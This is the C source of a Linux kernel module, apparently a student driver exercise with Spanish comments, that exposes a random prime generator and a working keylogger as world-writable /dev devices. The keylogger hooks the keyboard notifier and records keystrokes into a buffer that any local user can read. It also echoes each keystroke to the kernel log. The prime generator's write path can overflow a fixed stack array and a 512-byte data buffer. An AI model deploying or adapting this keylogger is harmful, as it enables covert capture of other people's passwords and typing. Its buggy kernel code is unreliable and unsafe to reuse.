#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/cdev.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <linux/notifier.h>
#include <linux/keyboard.h>
// #include <linux/moduleparam.h>

#define DRIVER_NAME "AdrianArboledasDriver"
#define DRIVER_CLASS "AdrianArboledasriversClass"
#define NUM_DEVICES 2 /* Número de dispositivos */
#define MEM_SIZE 512
#define BUFFER_KEYLOGGER_SIZE 1024

static dev_t major_minor = -1;
static struct cdev AdrianArboledascdev[NUM_DEVICES];
static struct class *AdrianArboledasclass = NULL;
int deviceIndex = -1;
int tamPrimos = 0;
static char keys_buffer[BUFFER_KEYLOGGER_SIZE]; // buffer donde almacenaremos las pulsaciones del usuario.
static char *keys_buffer_pointer = keys_buffer;
int key_buffer_position = 0; // Controlamos la posicion del buffer para no pasarnos de 1024.
int keyLoggerState = 0;
module_param(tamPrimos, int, 0660);
module_param(keyLoggerState, int, 0660);

static struct driverInternalData
{
    char data[MEM_SIZE];
    int dataSize;
} driverData;

/* ============ Funciones que implementan las operaciones del controlador ============= */

static int AdrianArboledasopen(struct inode *inode, struct file *file)
{
    pr_info("AdrianArboledasopen");
    deviceIndex = iminor(inode);
    pr_info("El valor de key state es %i", keyLoggerState);
    return 0;
}

/*************************************Start PrimosGenerador *************************************/
static int esPrimo(u32 generatedNumber)
{
    if (generatedNumber < 2)
        return 0;

    for (int i = 2; i < generatedNumber / 2; i++)
    {
        if (generatedNumber % i == 0)
        {
            return 0;
        }
    }
    return 1;
}

static void generaPrimo(int PrimesNumbers, u32 generatedPrimes[])
{
    u32 generatedNumber = 0;
    int cont = 0;

    do
    {
        generatedNumber = prandom_u32();

        if (generatedNumber > 0)
        {
            if (generatedNumber % 2 == 0)
            {
                generatedNumber = generatedNumber + 1;
            }

            if (esPrimo(generatedNumber) == 1)
            {
                generatedPrimes[cont] = generatedNumber;
                cont++;
            }
        }

    } while (cont < PrimesNumbers);
}

static ssize_t GeneradorPrimosread(struct file *file, char __user *buffer, size_t count, loff_t *f_pos)
{
    pr_info("GeneradorPrimosread");

    // Comprobamos si hemos leido todo.
    if (*f_pos >= driverData.dataSize)
        return 0;

    // Limitamos los datos que se pueden leer.
    count = driverData.dataSize - *f_pos;

    if (copy_to_user(buffer, driverData.data, count))
        return -EFAULT;

    *f_pos += count;

    return count;
}

static int pow(int base, int exp)
{

    int num = 1;
    for (int i = 0; i < exp; i++)
    {
        num *= base;
    }
    return num;
}

static ssize_t GeneradorPrimoswrite(struct file *file, const char __user *buffer, size_t count, loff_t *f_pos)
{
    pr_info("GeneradorPrimoswrite");

    u32 generatedPrimes[128];

    // Procedemos a reservar memoria
    char *data = kmalloc(count, GFP_KERNEL);

    if (!data)
    {
        return -ENOMEM; // no se ha podido reservar memoeria
    }

    if (copy_from_user(data, buffer, count))
    {
        kfree(data); // liberamos memoria.
        return -EFAULT;
    }

    int num = 0;
    int tamNumero = count - 1;

    for (int i = tamNumero - 1; i >= 0; i--)
    {
        num += (data[i] - '0') * pow(10, tamNumero - i - 1);
    }

    if (num != 0)
    {
        generaPrimo(num, generatedPrimes);
    }
    else
    {
        num = tamPrimos;
        generaPrimo(tamPrimos, generatedPrimes);
    }

    kfree(data);

    char aux[64];
    driverData.dataSize = 0;
    int dataPosition = 0;
    for (int i = 0; i < num; i++)
    {
        sprintf(aux, "Primo Generado %i: %u\n\0", i + 1, generatedPrimes[i]);
        int tam = strlen(aux);

        memcpy(driverData.data + dataPosition, aux, tam); // Copiamos los datos del vector aux al driver data
        dataPosition += tam;

        driverData.dataSize = dataPosition;
    }

    return count;
}

/*************************************END PrimosGenerador *************************************/

/*************************************START KEYLOGGER *************************************/

static void initBuffer(int tamBuffer, char buffer[])
{
    for (int i = 0; i < tamBuffer; i++)
    {
        buffer[i] = 0;
    }
}

static int keys_pressed(struct notifier_block *nb, unsigned long action, void *data);

static struct notifier_block notifyBlock = {
    .notifier_call = keys_pressed

};

static int keys_pressed(struct notifier_block *nb, unsigned long action, void *data)
{
    struct keyboard_notifier_param *keyBoardparam = data;

    // De entre todas las notificaciones nos quedamos con el evento de teclado que recoje caracteres no unicode.
    if (action == KBD_KEYSYM && keyBoardparam->down)
    {
        char character = keyBoardparam->value;

        pr_info("Caracter de la tilde: %c",character);




        if (character == 0x01)
        {                                    // si es un inicio de cabecera
            *(keys_buffer_pointer++) = 0x0a; // añadimos un salto de linea
            key_buffer_position++;
        }
        else if(character >= 0x20 && character < 0x7f){
            *(keys_buffer_pointer++) = character;
            key_buffer_position++;
        }

        // Comprobamos que no nos pasamos de la memoria asignada
        if (key_buffer_position >= BUFFER_KEYLOGGER_SIZE)
        {
            initBuffer(BUFFER_KEYLOGGER_SIZE, keys_buffer); // lo inicializamos a 0;
            keys_buffer_pointer = keys_buffer;
            key_buffer_position = 0;
        }
    }


    return NOTIFY_OK;
}

static ssize_t KeyLoggerRead(struct file *file, char __user *buffer, size_t count, loff_t *f_pos)
{
    int tam = strlen(keys_buffer);
    if (copy_to_user(buffer, keys_buffer, tam))
        return -EINVAL;

    initBuffer(BUFFER_KEYLOGGER_SIZE, keys_buffer); // lo inicializamos a 0;
    keys_buffer_pointer = keys_buffer;
    key_buffer_position = 0;

    return tam;
}

static ssize_t KeyLoggerWrite(struct file *file, const char __user *buffer, size_t count, loff_t *f_pos)
{

    // Procedemos a reservar memoria
    char *data = kmalloc(count, GFP_KERNEL);

    if (!data)
    {
        return -ENOMEM; // no se ha podido reservar memoeria
    }

    if (copy_from_user(data, buffer, count))
    {
        kfree(data); // liberamos memoria.
        return -EFAULT;
    }
    

    if(data[0] == '1'){
        register_keyboard_notifier(&notifyBlock);
    } else {
        //al quitar el registor del teclado, limpiamos el buffer
        initBuffer(BUFFER_KEYLOGGER_SIZE, keys_buffer); // lo inicializamos a 0;
        keys_buffer_pointer = keys_buffer;
        key_buffer_position = 0;

        unregister_keyboard_notifier(&notifyBlock);
    }

    kfree(data);
    return count;
}

static int AdrianArboledasrelease(struct inode *inode, struct file *file)
{
    pr_info("AdrianArboledasrelease");
    return 0;
}

/* ============ Estructura con las operaciones del controlador ============= */

static const struct file_operations GeneradorPrimos_fops = {
    .owner = THIS_MODULE,
    .open = AdrianArboledasopen,
    .read = GeneradorPrimosread,
    .write = GeneradorPrimoswrite,
    .release = AdrianArboledasrelease};

static const struct file_operations KeyLogger_fops = {
    .owner = THIS_MODULE,
    .open = AdrianArboledasopen,
    .read = KeyLoggerRead,
    .write = KeyLoggerWrite,
    .release = AdrianArboledasrelease};
/* ============ Inicialización del controlador ============= */

static struct drivers
{
    const char *name;
    const struct file_operations *foperation;
} driverList[NUM_DEVICES] = {
    [0] = {"PrimeGenerator", &GeneradorPrimos_fops},
    [1] = {"KeyLoger", &KeyLogger_fops}};

static int ECCdev_uevent(struct device *dev, struct kobj_uevent_env *env)
{
    add_uevent_var(env, "DEVMODE=%#o", 0666);
    return 0;
}

static int __init init_driver(void)
{
    int n_device;
    dev_t id_device;

    initBuffer(BUFFER_KEYLOGGER_SIZE, keys_buffer);
    if(keyLoggerState == 1){
        register_keyboard_notifier(&notifyBlock);
    }

    if (alloc_chrdev_region(&major_minor, 0, NUM_DEVICES, DRIVER_NAME) < 0)
    {
        pr_err("Major number assignment failed");
        goto error;
    }

    /* En este momento el controlador tiene asignado un "major number"
      Podemos consultarlo mirando en /proc/devices */

    pr_info("%s driver assigned %d major number\n", DRIVER_NAME, MAJOR(major_minor));

    if ((AdrianArboledasclass = class_create(THIS_MODULE, DRIVER_CLASS)) == NULL)
    {
        pr_err("Calss device registring failed ");
        goto error;
    }
    else
    {
        AdrianArboledasclass->dev_uevent = ECCdev_uevent; /* Evento para configurar los permisos de acceso */
    }

    pr_info("/sys/class/%s class driver registered\n", DRIVER_CLASS);

    for (n_device = 0; n_device < NUM_DEVICES; n_device++)
    {
        cdev_init(&AdrianArboledascdev[n_device], driverList[n_device].foperation);

        id_device = MKDEV(MAJOR(major_minor), MINOR(major_minor) + n_device);
        if (cdev_add(&AdrianArboledascdev[n_device], id_device, 1) == -1)
        {
            pr_err("Device node creation failed");
            goto error;
        }

        if (device_create(AdrianArboledasclass, NULL, id_device, NULL, driverList[n_device].name) == NULL)
        {
            pr_err("Device node creation failed");
            goto error;
        }

        pr_info("Device node /dev/%s%d created\n", driverList[n_device].name, n_device);
    }

    /* En este momento en /dev aparecerán los dispositivos ECCDriverN y en /sys/class/ECCDriver también */

    pr_info("AdrianArboledas driver initialized and loaded\n");
    return 0;

error:
    if (AdrianArboledasclass)
        class_destroy(AdrianArboledasclass);

    if (major_minor != -1)
        unregister_chrdev_region(major_minor, NUM_DEVICES);

    return -1;
}

/* ============ Descarga del controlador ============= */

static void __exit exit_driver(void)
{
    int n_device;

    if(keyLoggerState == 1)
        unregister_keyboard_notifier(&notifyBlock);

    for (n_device = 0; n_device < NUM_DEVICES; n_device++)
    {
        device_destroy(AdrianArboledasclass, MKDEV(MAJOR(major_minor), MINOR(major_minor) + n_device));
        cdev_del(&AdrianArboledascdev[n_device]);
    }

    class_destroy(AdrianArboledasclass);

    unregister_chrdev_region(major_minor, NUM_DEVICES);

    pr_info("AdrianArboledas driver unloaded\n");
}

/* ============ Meta-datos ============= */

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Adrian Arboledas");
MODULE_VERSION("0.1");
MODULE_DESCRIPTION("Skeleton of a full device driver module");

module_init(init_driver)
module_exit(exit_driver)
